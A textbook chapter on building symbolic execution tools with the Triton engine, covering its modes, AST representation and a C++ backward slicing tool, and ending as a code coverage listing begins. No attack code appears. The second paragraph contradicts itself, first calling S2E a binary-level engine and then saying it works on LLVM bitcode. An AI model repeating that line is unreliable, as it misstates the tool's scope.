<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch13"><span epub:type="pagebreak" id="page_333"/><span class="big">13</span><br/>PRACTICAL SYMBOLIC EXECUTION WITH TRITON</h2>&#13;
<p class="noindent">In <a href="ch12.xhtml#ch12">Chapter 12</a>, you became familiar with the principles of symbolic execution. Now let’s build real symbex tools with Triton, a popular open source symbolic execution engine. This chapter demonstrates how to build a backward slicing tool, increase code coverage, and automatically exploit a vulnerability with Triton.</p>&#13;
<p class="indent">There are a handful of symbolic execution engines in existence, and only a few of them can operate on binary programs. The best-known binary-level symbex engines are Triton, angr,<sup><a id="ch13fn_1a" href="footnote.xhtml#ch13fn_1">1</a></sup> and S2E.<sup><a id="ch13fn_2a" href="footnote.xhtml#ch13fn_2">2</a></sup> KLEE is another well-known symbex engine that operates on LLVM bitcode instead of binary code.<sup><a id="ch13fn_3a" href="footnote.xhtml#ch13fn_3">3</a></sup> I’ll use Triton because it integrates easily with Intel Pin and is slightly faster because of its C++ backend. Other famous symbex engines include KLEE and S2E, which operate on LLVM bitcode instead of binary code.</p>&#13;
<h3 class="h3" id="ch13_1"><span epub:type="pagebreak" id="page_334"/>13.1 Introduction to Triton</h3>&#13;
<p class="noindent">Let’s start by taking a more detailed look at Triton’s main features. Triton is a free, open source binary analysis library that’s best known for its symbolic execution engine. It offers APIs for C/C++ and Python and currently supports the x86 and x64 instruction sets. You can download Triton and find documentation at <em><a href="https://triton.quarkslab.com">https://triton.quarkslab.com</a></em>. I’ve preinstalled Triton version 0.6 (build 1364) on the VM in the directory <em>~/triton</em>.</p>&#13;
<p class="indent">Triton, like <code>libdft</code>, is an experimental tool (there are currently no fully mature binary-level symbex engines). That means you may encounter bugs, which you can report at <em><a href="https://github.com/JonathanSalwan/Triton/">https://github.com/JonathanSalwan/Triton/</a></em>. Triton also needs a special, manually written handler for every type of instruction, telling the symbex engine about the effects that instruction has on the symbolic state. As a result, you may face incorrect results or errors if the program you’re analyzing uses instructions not supported by Triton.</p>&#13;
<p class="indent">I’ll use Triton for the practical symbex examples because it’s easy to use, is relatively well documented, and is written in C++, which gives it a performance advantage over engines written in languages like Python. Moreover, Triton’s concolic mode is based on Intel Pin, with which you’re already familiar.</p>&#13;
<p class="indent">Triton supports two modes, a <em>symbolic emulation mode</em> and a <em>concolic execution mode</em>, that correspond to the static (SSE) and dynamic (DSE) symbex philosophies. In both modes, Triton allows you to concretize part of the state to reduce the complexity of the symbolic expressions. Recall that SSE doesn’t really run a program but rather emulates it, while concolic execution does run the program and tracks symbolic state as metadata. As a result, symbolic emulation mode is slower than concolic mode because it must emulate each instruction’s effects on both the symbolic and concrete states, whereas concolic mode gets the concrete state “for free.”</p>&#13;
<p class="indent">Concolic execution mode relies on Intel Pin and must run the analyzed program from the start. In contrast, with symbolic emulation you can easily emulate only part of a program, such as a single function, rather than the whole program. In this chapter, you’ll see practical examples of both symbolic emulation mode and concolic mode. For a more complete discussion of the advantages and disadvantages of the two approaches, refer to <a href="ch12.xhtml#ch12">Chapter 12</a>.</p>&#13;
<p class="indent">Triton is foremost an offline symbex engine, in the sense that it explores only a single path at a time. But it also features a snapshot mechanism that allows you to concolically explore multiple paths without having to completely start over every time. Moreover, it incorporates a coarse-grained taint analysis engine with one color. While you won’t need these features in this chapter, you can learn more about them from Triton’s online documentation and examples.</p>&#13;
<p class="indent">Recent versions of Triton also allow you to plug in a different binary instrumentation platform instead of Pin and a different constraint solver of your choice. In this chapter, I’ll simply use the defaults, which are Pin and Z3. The Triton version installed on the VM specifically requires Pin <span epub:type="pagebreak" id="page_335"/>version 2.14 (71313), which you’ll also find preinstalled in <em>~/triton/pin -2.14-71313-gcc.4.4.7-linux</em>.</p>&#13;
<h3 class="h3" id="ch13_2">13.2 Maintaining Symbolic State with Abstract Syntax Trees</h3>&#13;
<p class="noindent">In both emulation mode and concolic mode, Triton maintains a global set of symbolic expressions, a mapping from registers and memory addresses to these symbolic expressions, and a list of path constraints, similar to <a href="ch12.xhtml#ch12fig1">Figure 12-1</a> from <a href="ch12.xhtml#ch12">Chapter 12</a>. Triton represents symbolic expressions and constraints as <em>abstract syntax trees (ASTs)</em>, with one AST per expression or constraint. An AST is a tree data structure that depicts the syntactic relationships between operations and operands. The AST nodes contain operations and operands in Z3’s SMT language.</p>&#13;
<p class="indent">For example, <a href="ch13.xhtml#ch13fig1">Figure 13-1</a> shows how the AST for the <code>eax</code> register evolves over the following sequence of three instructions:</p>&#13;
<pre>shr eax,cl<br/>xor eax,0x1<br/>and eax,0x1</pre>&#13;
<p class="indent">For each instruction, the figure shows two ASTs side by side: a full AST on the left and an AST with <em>references</em> on the right. Let’s first discuss the left side of the figure, and then I’ll explain the ASTs with references.</p>&#13;
<h5 class="h5">Full ASTs</h5>&#13;
<p class="noindent">The figure assumes that <code>eax</code> and <code>cl</code> initially map to unbounded symbolic expressions corresponding to a 32-bit symbolic value <em>α</em><sub>1</sub> and an 8-bit symbolic value <em>α</em><sub>2</sub>, respectively. For example, you can see that the initial state for <code>eax</code> <span class="ent">➊</span> is an AST rooted at a <code>bv</code> (<em>bitvector</em>) node, with two child nodes containing the values <em>α</em><sub>1</sub> and 32. This corresponds to an unbounded 32-bit Z3 bitvector, as in <code>(declare-const alpha1 (_ BitVec 32))</code>.</p>&#13;
<p class="indent">The <code>shr eax,cl</code> instruction is a logical right shift that uses <code>eax</code> and <code>cl</code> as its operands and stores the result in <code>eax</code>. Thus, after this instruction <span class="ent">➋</span>, the full AST for <code>eax</code> has a <code>bvlshr</code> (logical right shift) node as its root, with child trees representing the original ASTs for <code>eax</code> and <code>cl</code>. Note that the right child tree, representing <code>cl</code>’s contents, is rooted at a <code>concat</code> operation that prepends 24 zero bits to <code>cl</code>’s value. That’s necessary because <code>cl</code> is only 8 bits wide, but you have to widen it to 32 bits (the same width as <code>eax</code>) because the SMT-LIB 2.0 format that Z3 uses requires that both operands to the <code>bvlshr</code> have the same bit width.</p>&#13;
<p class="indent">After the <code>xor eax,0x1</code> instruction <span class="ent">➌</span>, the AST for <code>eax</code> becomes a <code>bvxor</code> node with <code>eax</code>’s previous AST as the left subtree and a constant bitvector containing the value <code>1</code> as the right subtree. Similarly, <code>and eax,0x1</code> <span class="ent">➍</span> results in an AST rooted at a <code>bvand</code> node, again with <code>eax</code>’s previous AST as the left subtree and a constant bitvector as the right.</p>&#13;
<div class="image"><a id="ch13fig1"/><img src="Images/f334-01.jpg" alt="image" width="694" height="1112"/></div>&#13;
<p class="fig-caption"><span epub:type="pagebreak" id="page_336"/><em>Figure 13-1: Effect of instructions on register abstract syntax trees</em></p>&#13;
<h5 class="h5"><span epub:type="pagebreak" id="page_337"/>ASTs with References</h5>&#13;
<p class="noindent">You may have noticed that the full ASTs contain lots of redundancy: every time an AST depends on a previous one, the entire previous AST becomes a subtree in the new one. Large and complex programs have many dependencies between operations, so the previous scheme causes unnecessary memory overhead. That’s why Triton represents ASTs more compactly, using references, as shown on the right side of <a href="ch13.xhtml#ch13fig1">Figure 13-1</a>.</p>&#13;
<p class="indent">In this scheme, each AST has a name like <code>ref!1</code>, <code>ref!2</code>, and so on, which you can refer to from another AST. This way, instead of having to copy an entire previous AST, you can simply refer to it by including a <em>reference node</em> in the new AST. For example, the right side of <a href="ch13.xhtml#ch13fig1">Figure 13-1</a> shows how the entire left subtree in <code>eax</code>’s AST after the <code>and eax,0x1</code> instruction can be replaced with a single reference node that refers to the previous AST, compressing 15 nodes into just 1 node.</p>&#13;
<p class="indent">Triton offers an API function called <code>unrollAst</code> that allows you to expand an AST with references into a full AST so that you can manually inspect it, manipulate it, or pass it to Z3. Now that you’re familiar with Triton’s basic workings, let’s learn how to use <code>unrollAst</code> and other Triton functions in practice by taking a look at some examples.</p>&#13;
<h3 class="h3" id="ch13_3">13.3 Backward Slicing with Triton</h3>&#13;
<p class="noindent">This first example implements backward slicing in Triton’s symbolic emulation mode. This example is a generalized version of an example that comes with Triton, which you’ll find in <em>~/triton/pin-2.14-71313-gcc.4.4.7-linux/ source/tools/Triton/src/examples/python/backward_slicing.py</em>. The original Triton tool uses the Python API, but here I’ll use Triton’s C/C++ API instead. You’ll see an example of a Triton tool written in Python in <a href="ch13.xhtml#ch13_5">Section 13.5</a>.</p>&#13;
<p class="indent">Recall that backward slicing is a binary analysis technique that tells you, at a certain point in the execution, which previous instructions contributed to the value of a given register or memory address. For example, let’s say you want to compute the backward slice at address <code>0x404b1e</code> with respect to <code>rcx</code> in the code fragment from <em>/bin/ls</em> shown in <a href="ch13.xhtml#ch13list1">Listing 13-1</a>.</p>&#13;
<p class="listing1" id="ch13list1"><em>Listing 13-1: Disassembly excerpt from</em> /bin/ls</p>&#13;
<pre>  <span class="codestrong1">$ objdump -M intel -d /bin/ls</span><br/><br/>  ...<br/>  404b00:  49 89 cb           mov    r11,rcx<br/>  404b03:  48 8b 0f           mov    rcx,QWORD PTR [rdi]<br/>  404b06:  48 8b 06           mov    rax,QWORD PTR [rsi]<br/>  404b09:  41 56              push   r14<br/>  404b0b:  41 55              push   r13<br/>  404b0d:  41 ba 01 00 00 00  mov    r10d,0x1<br/>  404b13:  41 54              push   r12<br/>  404b15:  55                 push   rbp<br/>  404b16:  4c 8d 41 01        lea    r8,[rcx+0x1]<br/>  404b1a:  48 f7 d1           not    rcx<br/><span epub:type="pagebreak" id="page_338"/>  404b1d:  53                 push   rbx<br/><span class="ent">➊</span> 404b1e:  49 89 c9          mov    r9,rcx<br/>  ...</pre>&#13;
<p class="indent">The backward slice consists of all the instructions that contribute to the value of <code>rcx</code> at address <code>0x404b1e</code> <span class="ent">➊</span>. Thus, the slice should include the instructions shown in the following listing:</p>&#13;
<pre>404b03: mov rcx,QWORD PTR [rdi]<br/>404b1a: not rcx<br/>404b1e: mov r9,rcx</pre>&#13;
<p class="indent">Now let’s see how to automatically compute backward slices like this with Triton. You’ll first learn to build a backward slicing tool and then use it to slice the code fragment shown in <a href="ch13.xhtml#ch13list1">Listing 13-1</a>, producing the same result as the manual slice you just saw.</p>&#13;
<p class="indent">Because Triton expresses symbolic expressions as ASTs that reference each other, it’s easy to compute a backward slice for a given expression. <a href="ch13.xhtml#ch13list2">Listing 13-2</a> shows the first part of the implementation of the backward slicing tool. As usual, I’ve omitted includes of standard C/C++ header files from the listing.</p>&#13;
<p class="listing1" id="ch13list2"><em>Listing 13-2:</em> backward_slicing.cc</p>&#13;
<pre><span class="ent">➊</span> #include "../inc/loader.h"<br/>  #include "triton_util.h"<br/>  #include "disasm_util.h"<br/><br/>  #include &lt;triton/api.hpp&gt;<br/>  #include &lt;triton/x86Specifications.hpp&gt;<br/><br/>  int<br/>  main(int argc, char *argv[])<br/>  {<br/>    Binary bin;<br/>    triton::API api;<br/>    triton::arch::registers_e ip;<br/>    std::map&lt;triton::arch::registers_e, uint64_t&gt; regs;<br/>    std::map&lt;uint64_t, uint8_t&gt; mem;<br/><br/>    if(argc &lt; 6) {<br/>      printf("Usage: %s &lt;binary&gt; &lt;sym-config&gt; &lt;entry&gt; &lt;slice-addr&gt; &lt;reg&gt;\n", argv[0]);<br/>      return 1;<br/>    }<br/><br/>    std::string fname(argv[1]);<br/>    if(load_binary(fname, &amp;bin, Binary::BIN_TYPE_AUTO) &lt; 0) return 1;<br/><br/><span epub:type="pagebreak" id="page_339"/><span class="ent">➋</span>   if(set_triton_arch(bin, api, ip) &lt; 0) return 1;<br/>     api.enableMode(triton::modes::ALIGNED_MEMORY, true);<br/><br/><span class="ent">➌</span>   if(parse_sym_config(argv[2], &amp;regs, &amp;mem) &lt; 0) return 1;<br/>     for(auto &amp;kv: regs) {<br/>       triton::arch::Register r = api.getRegister(kv.first);<br/>       api.setConcreteRegisterValue(r, kv.second);<br/>     }<br/>     for(auto &amp;kv: mem) {<br/>       api.setConcreteMemoryValue(kv.first, kv.second);<br/>     }<br/><br/>     uint64_t pc         = strtoul(argv[3], NULL, 0);<br/>     uint64_t slice_addr = strtoul(argv[4], NULL, 0);<br/>     Section *sec = bin.get_text_section();<br/><br/><span class="ent">➍</span>   while(sec-&gt;contains(pc)) {<br/>       char mnemonic[32], operands[200];<br/><span class="ent">➎</span>     int len = disasm_one(sec, pc, mnemonic, operands);<br/>       if(len &lt;= 0) return 1;<br/><br/><span class="ent">➏</span>     triton::arch::Instruction insn;<br/>       insn.setOpcode(sec-&gt;bytes+(pc-sec-&gt;vma), len);<br/>       insn.setAddress(pc);<br/><br/><span class="ent">➐</span>     api.processing(insn);<br/><br/><span class="ent">➑</span>     for(auto &amp;se: insn.symbolicExpressions) {<br/>         std::string comment = mnemonic; comment += " "; comment += operands;<br/>         se-&gt;setComment(comment);<br/>       }<br/><br/><span class="ent">➒</span>     if(pc == slice_addr) {<br/>         print_slice(api, sec, slice_addr, get_triton_regnum(argv[5]), argv[5]);<br/>         break;<br/>       }<br/><br/><span class="ent">➓</span>     pc = (uint64_t)api.getConcreteRegisterValue(api.getRegister(ip));<br/>     }<br/><br/>     unload_binary(&amp;bin);<br/><br/>     return 0;<br/>   }</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_340"/>To use the tool, you provide it with the filename of the binary to analyze, a symbolic configuration file, the entry point address at which to start the analysis, the address at which to compute the slice, and the register with respect to which to compute the slice, all via command line arguments.</p>&#13;
<p class="indent">I’ll explain the purpose of the symbolic configuration file in a moment. Note that here, the entry point address is simply the address of the first instruction that the slicing tool will emulate; it doesn’t have to be the same as the binary’s entry point. For instance, to slice the example code from <a href="ch13.xhtml#ch13list1">Listing 13-1</a>, you use <code>0x404b00</code> as the entry point address so that the analysis emulates all the instructions shown in the listing up until the slice address.</p>&#13;
<p class="indent">The output of <code>backward_slicing</code> is a list of the assembly instructions that are in the slice. Now let’s take a more detailed look at how <code>backward_slicing</code> generates the program slice, starting with a more in-depth discussion of the necessary includes and the <code>main</code> function.</p>&#13;
<h4 class="h4" id="ch13_3_1"><em>13.3.1 Triton Header Files and Configuring Triton</em></h4>&#13;
<p class="noindent">The first thing you’ll notice in <a href="ch13.xhtml#ch13list2">Listing 13-2</a> is that it includes <em>../inc/loader.h</em> <span class="ent">➊</span> because <code>backward_slicing</code> uses the binary loader developed in <a href="ch04.xhtml#ch04">Chapter 4</a>. It also includes <em>triton_util.h</em> and <em>disasm_util.h</em>, which provide some utility functions I’ll describe shortly. Finally, there are two Triton-specific header files, both with the <em>.hpp</em> extension: <em>triton/api.hpp</em> provides the main Triton C<strong>++</strong> API, while <em>triton/x86Specifications.hpp</em> provides x86-specific definitions, such as register definitions. Besides including these header files, you must link with <code>-ltriton</code> to use Triton’s symbolic emulation mode.</p>&#13;
<p class="indent">The <code>main</code> function starts by loading the binary you’re analyzing using the <code>load_binary</code> function from the binary loader. Then, it configures Triton to the architecture of the binary using a function called <code>set_triton_arch</code> <span class="ent">➋</span>, defined in <em>backward_slicing.cc</em>, which I’ll discuss in detail in <a href="ch13.xhtml#ch13_3_4">Section 13.3.4</a>. It also calls Triton’s <code>api.enableMode</code> function to enable Triton’s <code>ALIGNED_MEMORY</code> mode, where <code>api</code> is an object of type <code>triton::API</code>, which is Triton’s main class that provides the C++ API.</p>&#13;
<p class="indent">Recall that symbolic memory accesses can greatly increase the size and complexity of the symbolic state because the symbex engine must model all possible outcomes of the memory access. Triton’s <code>ALIGNED_MEMORY</code> mode is an optimization that reduces the symbolic memory explosion by assuming that memory loads and stores access-aligned memory addresses. You can safely enable this optimization if you know memory accesses are aligned or if the precise memory addresses don’t matter for the analysis.</p>&#13;
<h4 class="h4" id="ch13_3_2"><em>13.3.2 The Symbolic Configuration File</em></h4>&#13;
<p class="noindent">In most of your symbex tools, you’ll want to make some registers and memory addresses symbolic or set them to specific concrete values. Which parts of the state you make symbolic and which concrete values you use depend on the application you’re analyzing and the paths you want to explore. Thus, if you hardcode the decisions on what state to symbolize and concretize, your symbex tool will be application specific.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_341"/>To prevent that, let’s create a simple <em>symbolic configuration file</em> format in which you can configure these decisions. There’s a utility function called <code>parse_sym_config</code>, defined in <em>triton_util.h</em>, that you can use to parse symbolic configuration files and load them into your symbex tool. The following listing shows an example symbolic configuration file:</p>&#13;
<pre>%rax=0<br/>%rax=$<br/>@0x1000=5</pre>&#13;
<p class="indent">In the symbolic configuration file format, you denote registers by <code>%</code><em>name</em> and memory addresses by <code>@</code><em>address</em>. You can assign concrete integers to each register or memory byte or make them symbolic by assigning the value <code>$</code>. For example, this configuration file assigns the concrete value <code>0</code> to <code>rax</code> and then makes <code>rax</code> symbolic and assigns the value <code>5</code> to the byte at memory address <code>0x1000</code>. Note that <code>rax</code> is symbolic but at the same time has a concrete value to drive the emulation to the correct path.</p>&#13;
<p class="indent">Now let’s get back to <a href="ch13.xhtml#ch13list2">Listing 13-2</a>. After loading the binary to analyze and configuring Triton, <code>backward_slicing</code> calls <code>parse_sym_config</code> to parse the symbolic configuration file specified on the command line <span class="ent">➌</span>. This function takes the filename of the configuration file as input, followed by two parameters that are both references to <code>std::map</code> objects in which <code>parse_sym_config</code> loads the configuration. The first <code>std::map</code> maps Triton register names (of an <code>enum</code> type called <code>triton::arch::registers_e</code>) to concrete <code>uint64_t</code> values containing the register contents, while the second <code>std::map</code> maps memory addresses to concrete byte values.</p>&#13;
<p class="indent">Actually, <code>parse_sym_config</code> takes two more optional parameters to load the lists of symbolic registers and memory addresses into. I haven’t used those here because to compute slices, you’re interested only in the ASTs that Triton builds, and by default Triton builds ASTs even for registers and memory locations that you haven’t explicitly made symbolic.<sup><a id="ch13fn_4a" href="footnote.xhtml#ch13fn_4">4</a></sup> You’ll see an example where you do need to explicitly symbolize some parts of the state in <a href="ch13.xhtml#ch13_4">Section 13.4</a>.</p>&#13;
<p class="indent">Directly after the call to <code>parse_sym_config</code>, the <code>main</code> function of <code>backward _slicing</code> contains two <code>for</code> loops. The first loops over the map of just-loaded concrete register values and tells Triton to assign these concrete values to its internal state. To do that, you call <code>api.setConcreteRegisterValue</code>, which takes a Triton register and a concrete integer value as input. Triton registers have the type <code>triton::arch::Register</code>, and you can obtain them from a Triton register name (of the <code>enum</code> type <code>triton::arch::registers_e</code>) using the <code>api.getRegister</code> function. Each register name has the form <code>ID_REG_</code><em>name</em>, where <em>name</em> is an uppercase register name like <code>AL</code>, <code>EBX</code>, <code>RSP</code>, and so on.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_342"/>Similarly, the second <code>for</code> loop goes over the map of concrete memory values and tells Triton about them using <code>api.setConcreteMemoryValue</code>, which takes a memory address and a concrete byte value as input.<sup><a id="ch13fn_5a" href="footnote.xhtml#ch13fn_5">5</a></sup></p>&#13;
<h4 class="h4" id="ch13_3_3"><em>13.3.3 Emulating Instructions</em></h4>&#13;
<p class="noindent">Loading the symbolic configuration file is the last part of the setup code for <code>backward_slicing</code>. Now, the main emulation loop that emulates instructions from the binary begins, starting at the user-specified entry point address and continuing until it hits the instruction at which to compute the slice. This sort of emulation loop is typical of nearly all symbolic emulation tools you’ll write with Triton.</p>&#13;
<p class="indent">The emulation loop is simply a <code>while</code> loop that stops when the slice is complete or when it encounters an instruction address outside of the binary’s <code>.text</code> section <span class="ent">➍</span>. To keep track of the current instruction address, there’s an emulated program counter called <code>pc</code>.</p>&#13;
<p class="indent">Each iteration of the loop starts by disassembling the current instruction using <code>disasm_one</code> <span class="ent">➎</span>, another utility function I’ve provided in <em>disasm_util.h</em>. It uses Capstone to obtain strings containing the instruction’s mnemonic and operands, needed in a moment.</p>&#13;
<p class="indent">Next, <code>backward_slicing</code> builds a Triton instruction object of type <code>triton:: arch::Instruction</code> for the current instruction <span class="ent">➏</span> and uses the <code>Instruction</code>’s <code>setOpcode</code> function to populate it with the instruction opcode bytes taken from the binary’s <code>.text</code> section. It also sets the <code>Instruction</code>’s address to the current <code>pc</code> using the <code>setAddress</code> function.</p>&#13;
<p class="indent">After creating a Triton <code>Instruction</code> object for the current instruction, the emulation loop <em>processes</em> the <code>Instruction</code> by calling the <code>api.processing</code> function <span class="ent">➐</span>. Despite its generic name, the <code>api.processing</code> function is central to Triton symbolic emulation tools because it performs the actual instruction emulation and advances Triton’s symbolic and concrete state based on the emulation results.</p>&#13;
<p class="indent">After the current instruction is processed, Triton will have built internal abstract syntax trees representing the symbolic expressions for register and memory states affected by the instruction. Later, you’ll see how to use these symbolic expressions to compute the backward slice. To produce a slice that contains x86 instructions, not symbolic expressions in SMT-LIB 2.0 format, you need to track which instruction is associated with each symbolic expression. The <code>backward_slicing</code> tool achieves that by looping over the list of all symbolic expressions associated with the just-processed instruction and decorating each expression with a comment that contains the instruction mnemonic and operand strings obtained earlier from the <code>disasm_one</code> function <span class="ent">➑</span>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_343"/>To access an <code>Instruction</code>’s list of symbolic expressions, you can use its <code>symbolicExpressions</code> member, which is an object of type <code>std::vector&lt;triton:: engines::symbolic::SymbolicExpression*&gt;</code>. The <code>SymbolicExpression</code> class provides a function called <code>setComment</code> that allows you to specify a comment string for a symbolic expression.</p>&#13;
<p class="indent">When the emulation reaches the slice address, <code>backward_slicing</code> calls a function called <code>print_slice</code> that computes and prints the slice and then breaks out of the emulation loop <span class="ent">➒</span>. Note that <code>get_triton_regnum</code> is another utility function from <em>triton_util.h</em> that returns the corresponding Triton register identifier based on a human-readable register name. Here, it returns the register identifier for the register to slice, to pass to <code>print_slice</code>.</p>&#13;
<p class="indent">When you call Triton’s <code>processing</code> function, Triton internally updates the concrete instruction pointer value to point to the next instruction. At the end of each emulation loop iteration, you get this new instruction pointer value using the function <code>api.getConcreteRegisterValue</code> and assign it to your own program counter (called <code>pc</code> in this example) that drives the emulation loop <span class="ent">➓</span>. Note that for 32-bit x86 programs, you need to fetch the contents of <code>eip</code>, while for x64 programs, the instruction pointer is <code>rip</code>. Let’s now take a look at how the <code>set_triton_arch</code> function mentioned earlier configures the <code>ip</code> variable with the identifier of the correct instruction pointer register for the emulation loop to use.</p>&#13;
<h4 class="h4" id="ch13_3_4"><em>13.3.4 Setting Triton’s Architecture</em></h4>&#13;
<p class="noindent">The <code>backward_slicing</code> tool’s <code>main</code> function calls <code>set_triton_arch</code> to configure Triton with the instruction set of the binary and get the name of the instruction pointer register used in that architecture. <a href="ch13.xhtml#ch13list3">Listing 13-3</a> shows how <code>set_triton_arch</code> is implemented.</p>&#13;
<p class="listing1" id="ch13list3"><em>Listing 13-3:</em> backward_slicing.cc <em>(continued)</em></p>&#13;
<pre>  static int<br/>  set_triton_arch(Binary &amp;bin, triton::API &amp;api, triton::arch::registers_e &amp;ip)<br/>  {<br/><span class="ent">➊</span>   if(bin.arch != Binary::BinaryArch::ARCH_X86) {<br/>       fprintf(stderr, "Unsupported architecture\n");<br/>       return -1;<br/>     }<br/><br/><span class="ent">➋</span>   if(bin.bits == 32) {<br/><span class="ent">➌</span>     api.setArchitecture(triton::arch::ARCH_X86);<br/><span class="ent">➍</span>     ip = triton::arch::ID_REG_EIP;<br/>     } else if(bin.bits == 64) {<br/><span class="ent">➎</span>     api.setArchitecture(triton::arch::ARCH_X86_64);<br/><span class="ent">➏</span>     ip = triton::arch::ID_REG_RIP;<br/><br/><span epub:type="pagebreak" id="page_344"/>&#13;
    } else {<br/>      fprintf(stderr, "Unsupported bit width for x86: %u bits\n", bin.bits);<br/>      return -1;<br/>    }<br/><br/>    return 0;<br/> }</pre>&#13;
<p class="indent">The function takes three parameters: a reference to the <code>Binary</code> object returned by the binary loader, a reference to the Triton API, and a reference to a <code>triton::arch::registers_e</code> in which to store the name of the instruction pointer register. If successful, <code>set_triton_arch</code> returns 0, and if there’s an error, it returns −1.</p>&#13;
<p class="indent">First, <code>set_triton_arch</code> ensures that it’s dealing with an x86 binary (either 32-bit or 64-bit) <span class="ent">➊</span>. If this is not the case, it returns with an error because Triton cannot currently deal with architectures other than x86.</p>&#13;
<p class="indent">If there’s no error, <code>set_triton_arch</code> checks the bit width of the binary <span class="ent">➋</span>. If the binary uses 32-bit x86, it configures Triton in 32-bit x86 mode (<code>triton::arch::ARCH_X86</code>) <span class="ent">➌</span> and sets <code>ID_REG_EIP</code> as the name of the instruction pointer register <span class="ent">➍</span>. Similarly, if it’s an x64 binary, it sets the Triton architecture to <code>triton::arch::ARCH_X86_64</code> <span class="ent">➎</span> and sets <code>ID_REG_RIP</code> as the instruction pointer <span class="ent">➏</span>. To configure Triton’s architecture, you use the <code>api.setArchitecture</code> function, which takes the architecture type as its only parameter.</p>&#13;
<h4 class="h4" id="ch13_3_5"><em>13.3.5 Computing the Backward Slice</em></h4>&#13;
<p class="noindent">To compute and print the actual slice, <code>backward_slicing</code> calls the <code>print_slice</code> function when the emulation hits the address at which to slice. You can see the implementation of <code>print_slice</code> in <a href="ch13.xhtml#ch13list4">Listing 13-4</a>.</p>&#13;
<p class="listing1" id="ch13list4"><em>Listing 13-4:</em> backward_slicing.cc <em>(continued)</em></p>&#13;
<pre>   static void<br/>   print_slice(triton::API &amp;api, Section *sec, uint64_t slice_addr,<br/>               triton::arch::registers_e reg, const char *regname)<br/>   {<br/>     triton::engines::symbolic::SymbolicExpression *regExpr;<br/>     std::map&lt;triton::usize, triton::engines::symbolic::SymbolicExpression*&gt; slice;<br/>     char mnemonic[32], operands[200];<br/><br/><span class="ent">➊</span>    regExpr = api.getSymbolicRegisters()[reg];<br/><span class="ent">➋</span>    slice = api.sliceExpressions(regExpr);<br/><br/><span class="ent">➌</span>    for(auto &amp;kv: slice) {<br/>        printf("%s\n", kv.second-&gt;getComment().c_str());<br/>     }<br/><span epub:type="pagebreak" id="page_345"/><span class="ent">➍</span>   disasm_one(sec, slice_addr, mnemonic, operands);<br/>     std::string target = mnemonic; target += " "; target += operands;<br/><br/>     printf("(slice for %s @ 0x%jx: %s)\n", regname, slice_addr, target.c_str());<br/>  }</pre>&#13;
<p class="indent">Recall that slices are computed with respect to a particular register, as specified by the <code>reg</code> parameter. To compute the slice, you need the symbolic expression associated with that register just after emulating the instruction at the slice address. To get this expression, <code>print_slice</code> calls <code>api.getSymbolicRegisters</code>, which returns a map of all registers to their associated symbolic expressions and then indexes that map to obtain the expression associated with <code>reg</code> <span class="ent">➊</span>. Then it obtains the slice of all symbolic expressions that contribute to <code>reg</code>’s expression using <code>api.sliceExpressions</code> <span class="ent">➋</span>, which returns the slice in the form of a <code>std::map</code> that maps integer expression identifiers to <code>triton::engines::symbolic::SymbolicExpression*</code> objects.</p>&#13;
<p class="indent">You now have a slice of symbolic expressions, but what you really want is a slice of x86 assembly instructions. This is precisely the purpose of the symbolic expression comments, which associate each expression with the assembly mnemonic and operand strings of the instruction that produced the expression. Thus, to print the slice, <code>print_slice</code> simply loops over the slice of symbolic expressions, gets their comments using <code>getComment</code>, and prints the comments to screen <span class="ent">➌</span>. For completeness, <code>print_slice</code> also disassembles the instruction at which you’re computing the slice and prints it to screen as well <span class="ent">➍</span>.</p>&#13;
<p class="indent">You can try the <code>backward_slice</code> program on the VM by running it as shown in <a href="ch13.xhtml#ch13list5">Listing 13-5</a>.</p>&#13;
<p class="listing1" id="ch13list5"><em>Listing 13-5: Computing the backward slice at</em> <span class="codeitalic">0x404b1e</span> <em>with respect to</em> <span class="codeitalic">rcx</span></p>&#13;
<pre><span class="codestrong1"><span class="ent">➊</span> $ ./backward_slicing /bin/ls empty.map 0x404b00 0x404b1e rcx</span><br/><span class="ent">➋</span> mov rcx, qword ptr [rdi]<br/>  not rcx<br/>  (slice for rcx @ 0x404b1e: mov r9, rcx)</pre>&#13;
<p class="indent">Here, I’ve used <code>backward_slicing</code> to compute a slice over the code fragment from <em>/bin/ls</em> you saw in <a href="ch13.xhtml#ch13list1">Listing 13-1</a> <span class="ent">➊</span>. I’ve used an empty symbolic configuration file (<em>empty.map</em>) and specified <code>0x404b00</code>, <code>0x404b1e</code>, and <code>rcx</code> as the entry point address, the slice address, and the register to slice, respectively. As you can see, this produces the same output as the manually computed slice you saw before <span class="ent">➋</span>.</p>&#13;
<p class="indent">The reason it’s okay to use an empty symbolic configuration file in this example is that the analysis doesn’t rely on any particular registers or memory locations being symbolic, and you don’t need any specific concrete values to drive the execution since the code fragment you’re analyzing doesn’t contain any branches. Now let’s take a look at another example where you’ll need a nonempty symbolic configuration to explore multiple paths through the same program.</p>&#13;
<h3 class="h3" id="ch13_4"><span epub:type="pagebreak" id="page_346"/>13.4 Using Triton to Increase Code Coverage</h3>&#13;
<p class="noindent">Because the backward slicing example needed only Triton’s ability to track symbolic expressions for registers and memory locations, it didn’t use symbolic execution’s core strength: reasoning about program properties through constraint solving. In this example, you’ll get acquainted with Triton’s constraint-solving abilities in the classic symbex use case of <em>code coverage</em>.</p>&#13;
<p class="indent"><a href="ch13.xhtml#ch13list6">Listing 13-6</a> shows the first part of the source of the <code>code_coverage</code> tool. You’ll notice that a lot of the source is the same as or similar to that of the previous example. In fact, I’ve omitted the <code>set_triton_arch</code> function from the listing because it’s exactly the same as in the <code>backward_slicing</code> tool.</p>&#13;
<p class="listing1" id="ch13list6"><em>Listing 13-6:</em> code_coverage.cc</p>&#13;
